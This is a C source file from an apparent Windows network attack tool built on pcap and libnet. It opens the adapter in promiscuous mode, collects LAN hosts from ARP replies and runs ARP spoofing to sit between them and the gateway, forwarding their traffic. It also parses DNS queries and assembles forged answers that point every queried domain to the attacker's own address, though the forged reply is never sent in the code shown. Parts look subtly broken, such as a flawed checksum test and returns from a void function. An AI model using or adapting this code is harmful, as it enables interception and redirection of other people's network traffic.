#include <pcap.h>
#include <iphlpapi.h>
#include <libnet.h>
#include "../common/error/udo_error.h"
#include "udo_host.h"
#include "udo_arp.h"
#include "udo_link_layer.h"
#include "udo_adapter.h"




#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

static char* str_cap = "rpcap://\\Device\\NPF_";

static void udo_adapter_get(udo_adapter* self, int adapter_type);

static void udo_adapter_open(udo_adapter* self);

static unsigned int udo_adapter_cksum(udo_adapter* self, unsigned char* packet, int len);

void udo_adapter_init(udo_adapter* self, int adapter_type)
{
	udo_ip_init(&self->ip);
	udo_ip_init(&self->gateway_ip);
	udo_arp_spoofing_init(&self->arp_spoofing, self);
	udo_arp_spoofing_stop(&self->arp_spoofing);
	memset(self->mac_addr, 0, UDO_IP_ADDR_FORMAT_LEN);
	memset(self->adapter_name, 0, UDO_ADAPTER_NAME_LENGTH);
	memset(self->mac_gateway, 0, UDO_ADAPTER_NAME_LENGTH);

	self->adapter_type = adapter_type;
	self->mac_len = 0;
	udo_adapter_get(self, adapter_type);
	udo_adapter_open(self);

}

unsigned char* udo_adapter_mac(udo_adapter* self)
{
	return self->mac_addr;
}

udo_ip* udo_adapter_ip(udo_adapter* self)
{
	return &self->ip;
}

void udo_adapter_term(udo_adapter* self)
{

}

void udo_adapter_get(udo_adapter* self, int adapter_type)
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;

	ULONG ulOutBufLen = sizeof (IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO *)MALLOC(sizeof (IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL)
	{
		udo_assert_system(0);
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
	{
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL)
		{
			udo_assert_system(0);
		}
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR)
	{
		pAdapter = pAdapterInfo;
		while (pAdapter)
		{
			if (self->adapter_type != pAdapter->Type)
			{
				pAdapter = pAdapter->Next;
				continue;
			}
			udo_ip_setformat(&self->ip, pAdapter->IpAddressList.IpAddress.String);
			memcpy(self->mac_addr, pAdapter->Address, pAdapter->AddressLength);
			self->mac_len = pAdapter->AddressLength;
			memcpy(self->adapter_name, pAdapter->AdapterName, strlen(pAdapter->AdapterName));
			udo_ip_setformat(&self->gateway_ip, pAdapter->GatewayList.IpAddress.String);
			memcpy(self->mask, pAdapter->IpAddressList.IpMask.String, UDO_IP_ADDR_FORMAT_LEN);
			break;
		}
	}
	else
	{
		udo_assert_system(0);
	}
	if (pAdapterInfo)
	{
		FREE(pAdapterInfo);
	}
}

int udo_adapter_mlen(udo_adapter* self)
{
	return self->mac_len;
}

char* udo_adapter_name(udo_adapter* self)
{
	return self->adapter_name;
}

udo_ip* udo_adapter_gateway(udo_adapter* self)
{
	return &self->gateway_ip;
}

unsigned char* udo_adapter_mask(udo_adapter* self)
{
	return self->mask;
}

void udo_adapter_open(udo_adapter* self)
{
	char adapter_name[256] = "";
	char errbuf[PCAP_ERRBUF_SIZE] = "";
	int cap_len = strlen(str_cap);
	memcpy(adapter_name, str_cap, cap_len);
	memcpy(&adapter_name[cap_len], self->adapter_name,
		strlen(udo_adapter_name(self)));
	self->adhandle = pcap_open(adapter_name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1, NULL, errbuf);
	udo_assert_str(self->adhandle, errbuf);
}

void udo_adapter_send(udo_adapter* self, char* packet, int packet_len)
{
	if (pcap_sendpacket(self->adhandle, packet, packet_len) != 0)
	{
		printf("send error\n");
	}
}
#include "udo_ippack.h"
#include "udo_udp.h"
#include "udo_dns.h"
int counter = 4800;
int udo_adapter_rpacket(udo_adapter* self, unsigned char** packet, int *packet_len)
{
	int ret = 0;
	struct pcap_pkthdr *header;

	if (strlen(self->mac_gateway) == 0)
	{
		udo_arp arp_request;
		udo_arp_init(&arp_request, self);
		udo_arp_request(&arp_request, &self->gateway_ip);
		udo_arp_term(&arp_request);
	}
	ret = pcap_next_ex(self->adhandle, &header, packet);
	if (counter > 5000)
	{
		counter = 0;
	}
	counter++;
	if (ret == 0)
	{
		if (counter == 5000)
		{
			printf("send response\n");
			udo_arp_spoofing_start(&self->arp_spoofing);
			udo_arp_spoofing_exec(&self->arp_spoofing);
		}

	}


	udo_link_layer link_layer;
	udo_link_layer_init(&link_layer);
	udo_link_layer_deserialize(&link_layer, *packet);

	if (strncmp(udo_adapter_mac(self), udo_link_layer_getsrc(&link_layer), UDO_MAC_ADDR_LEN) == 0)
	{
		return 0;
	}

	if (udo_link_layer_gettype(&link_layer) == UDO_LINK_TYPE_ARP)
	{
		udo_arp arp;
		udo_arp_init(&arp, NULL);
		udo_arp_deserialize(&arp, *packet, UDO_LINK_LAYER_LEN);

		if (udo_ip_equal(udo_arp_getsia(&arp), udo_adapter_gateway(self)))
		{
			if (udo_arp_getop(&arp) == UDO_ARP_RESPONSE)
			{
				memcpy(self->mac_gateway, udo_link_layer_getsrc(&link_layer), UDO_MAC_ADDR_LEN);
				return 0;
			}
			if (strncmp(udo_adapter_mac(self), udo_link_layer_getdst(&link_layer), UDO_MAC_ADDR_LEN) == 0)
			{
				return 0;
			}
		}
		if (udo_arp_getop(&arp) == UDO_ARP_RESPONSE)
		{
			udo_host host;
			udo_host_init(&host);
			udo_host_setip(&host, udo_arp_getsia(&arp));
			udo_host_setmac(&host, udo_link_layer_getsrc(&link_layer));
			udo_arp_spoofing_addhost(&self->arp_spoofing, &host);
			udo_host_term(&host);
			return 0;
		}
	}
	else
	{
		if (strlen(self->mac_gateway) == 0)
		{
			return 0;
		}


		if (strncmp(udo_adapter_mac(self), udo_link_layer_getdst(&link_layer), UDO_MAC_ADDR_LEN) == 0 &&
			strncmp(self->mac_gateway, udo_link_layer_getsrc(&link_layer), UDO_MAC_ADDR_LEN) != 0)
		{

			
			if (udo_link_layer_gettype(&link_layer) == UDO_ETHERNET_IP)
			{
				udo_ippack ip_header;
				udo_ippack_init(&ip_header);
				udo_ippack_deserialize(&ip_header, *packet, UDO_LINK_LAYER_LEN);

				if (udo_ippack_getprotocol(&ip_header) == UDO_UDP_PROCOTOL)
				{
					unsigned int data_offset = udo_ippack_dataoffset(&ip_header);
					udo_udp udp;
					udo_udp_init(&udp);
					udo_udp_deserialize(&udp, (*packet), UDO_LINK_LAYER_LEN + data_offset);
					if (udo_udp_getdstport(&udp) == 53)
					{
						udo_dns dns;
						udo_dns_init(&dns);
						udo_dns_deserialize(&dns, (*packet), UDO_LINK_LAYER_LEN + data_offset + 8);
						printf("%s\n", dns.domain_name);
						if (1/*strstr(dns.domain_name, "shifen") || strstr(dns.domain_name, "baidu")*/)
						{
							libnet_t *l;
							char errbuf[LIBNET_ERRBUF_SIZE];
							l = libnet_init(LIBNET_LINK_ADV,NULL,errbuf); 
							if (!l)
							{
								fprintf(stderr, "libnet_init: %s", errbuf);
							}
							//libnet_build_dnsv4


							unsigned char dns_packet[128] = "";
							unsigned char* t_packet = dns_packet;
							unsigned char* domain = dns.domain_name;
							while (1)
							{
								if (domain[0] == '\0')
								{
									t_packet[0] = '\0';
									t_packet++;
									break;
								}
								unsigned char len = 0;
								while (domain[0] != '.')
								{
									t_packet[len + 1] = domain[0];
									domain++;
									len++;
									if (domain[0] == '\0')
									{
										break;
									}
								}
								if (domain[0] == '.')
								{
									domain++;
								}
								t_packet[0] = len;
								t_packet += (len + 1);
							}
							*(unsigned short*)t_packet = htons(1);
							t_packet += 2;
							*(unsigned short*)t_packet = htons(1);
							t_packet += 2;
							*(unsigned int*)t_packet = htonl(172800);
							t_packet += 4;
							*(unsigned short*)t_packet = htons(4);
							t_packet += 2;
							memcpy(t_packet, udo_ip_getnet(udo_adapter_ip(self)), UDO_IP_ADDR_LEN);
							t_packet += UDO_IP_ADDR_LEN;
							int length = t_packet - dns_packet;
// 							for (int i = 0; i < length; ++i)
// 							{
// 								printf("%02x ", dns_packet[i]);
// 							}
// 							printf("\n");

							/*libnet_build_dnsv4(LIBNET_UDP_DNSV4_H,)*/
						}
						
					}
				}
			}

			udo_adapter_forward(self, &link_layer, (*packet) + 14, header->len - 14);
			counter--;
			udo_arp_spoofing_run(&self->arp_spoofing);
			return 0;
		}
	}



	if (ret > 0)
	{
		*packet_len = header->len;
	}
	return ret;
}

void udo_adapter_forward(udo_adapter* self, udo_link_layer* link_layer, unsigned char* packet, int packet_len)
{


	libnet_t *net_t = NULL;
	char errbuf[LIBNET_ERRBUF_SIZE];
	libnet_ptag_t p_tag;
	int res;


	char adapter_name[256] = "";
	int cap_len = strlen(str_cap);
	memcpy(adapter_name, str_cap, cap_len);
	memcpy(&adapter_name[cap_len], self->adapter_name,
		strlen(udo_adapter_name(self)));

	/* start libnet */
	net_t = libnet_init(LIBNET_LINK_ADV, NULL, errbuf);
	if (net_t == NULL)
	{
		printf("libnet start error\n");
		return 1;
	}
	unsigned char* mac = udo_link_layer_getsrc(link_layer);
	for (int i = 0; i < UDO_MAC_ADDR_LEN; ++i)
	{
		printf("%02x ", mac[i]);
	}
	printf("\n");

	/* build ethernet */
	p_tag = libnet_build_ethernet(self->mac_gateway, udo_link_layer_getsrc(link_layer),
		udo_link_layer_gettype(link_layer), packet, packet_len, net_t, 0);
	if (p_tag == -1) {
		printf("libnet build error\n");
		libnet_destroy(net_t);
		return 1;
	}

	res = libnet_write(net_t);
	if (res == -1) {
		printf("IP libnet write error\n");
		libnet_destroy(net_t);
		return 1;
	}

	/* success */
	libnet_destroy(net_t);
}

unsigned int udo_adapter_cksum(udo_adapter* self, unsigned char* packet, int len)
{
	unsigned int sum = 0;
	while (len > 1)
	{
		sum += *((unsigned short*)packet)++;
		if (sum * 0x80000000)
			sum = (sum & 0xFFFF) + (sum >> 16);
		len -= 2;
	}
	if (len)
	{
		sum += (unsigned short)*(unsigned char*)packet;
	}
	return ~sum;
}
